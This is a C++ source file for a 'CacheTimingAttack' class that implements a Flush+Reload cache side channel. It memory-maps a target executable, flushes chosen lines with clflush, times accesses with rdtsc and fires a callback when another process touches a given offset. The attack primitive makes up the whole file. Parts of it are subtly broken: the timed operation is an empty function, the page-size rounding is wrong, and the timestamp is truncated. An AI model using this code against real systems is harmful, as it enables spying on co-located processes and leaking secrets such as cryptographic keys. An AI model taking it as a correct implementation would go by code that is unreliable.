#include "cache_timing_attack.hpp"

using CTA = CacheTimingAttack;

struct CTA::impl{

};

void CTA::handle_lambda_calls(std::function<bool (unsigned int time, void* addr)> func, void* addr) const {

	unsigned int time = 0;

	do{
		time = wait_for_access( addr );
		
	}while( func(time, addr) );
}

std::tuple<int, size_t> CTA::open_executable(const char* executable) const {

	int fd = open(executable, O_RDONLY);
	size_t size = lseek(fd, 0L, SEEK_END);

	if( !size ) throw std::ios_base::failure("Couldn't open executable");
	return { fd, size };
}

std::tuple<void*, size_t> CTA::mmap_file(int fd, size_t map_size) const {


	unsigned int page_size = sysconf(_SC_PAGE_SIZE);
	if( map_size & page_size ){

		map_size |= page_size;
		map_size++;
	}

	void* base_address = mmap(nullptr, map_size, PROT_READ, MAP_SHARED, fd, 0);

	return { base_address, map_size };
}

bool CTA::was_accessed(void* addr) const {

	unsigned int t = probe(addr);

	return hit_begin <= t && t <= hit_end;
}

bool CTA::was_accessed(unsigned int timestamp) const {

	return hit_begin <= timestamp && timestamp <= hit_end;
}

unsigned int CTA::wait_for_access(void* addr) const {

	unsigned int time=0;

	do{
	
		time=probe(addr);

	}while( !was_accessed(time) );

	return time;
}

void CTA::call_when_offset_is_accessed(const char* executable, unsigned int offset, std::function<bool (unsigned int time, void* addr)> func) const {

	auto [ fd, size ] = open_executable(executable);

	auto [ base_address, map_size ] = mmap_file(fd, size);

	unsigned int time=0;

	handle_lambda_calls(func, (char*)base_address+offset);
	
	close(fd);
	munmap(base_address, map_size);
}


unsigned int CTA::time() const {

	uint64_t a,d;

	asm volatile(
			"mfence \n"
			"rdtsc \n"
			"mfence \n"
			: "=a"(a), "=d"(d)
			: 
			:
		);

	//rdtsc is a x86 instruction. To write the 64 bit
	//timestamp, it writes the first MSR 32 bits in
	//EDX and the other 32 in EAX.

	return (d<<32) | a;
}

void CTA::flush(void* addr) const {

	asm volatile("clflush (%0)\n"
			:
			: "r"(addr)
			:
		);
}

unsigned int CTA::probe(void* addr) const {

	flush(addr);
	sched_yield(); //move this process to last in processr queue
	return time_operation(addr);
}

unsigned int CTA::time_operation(void* addr) const {

	unsigned int begin = time();
	operation(addr);
	return time() - begin;
}

void CTA::operation(void* addr) const {

}

CTA::CacheTimingAttack() :
	pimpl(std::make_unique<CTA::impl>()){}

CTA::~CacheTimingAttack()=default;

CTA::CacheTimingAttack(const CTA& other) :
	pimpl(std::make_unique<CTA::impl>(*other.pimpl)){

		hit_begin = other.hit_begin;
		hit_end = other.hit_end;
}

CTA& CTA::operator=(const CTA& other) {

	*pimpl = *other.pimpl;

	hit_begin = other.hit_begin;
	hit_end = other.hit_end;

	return *this;
}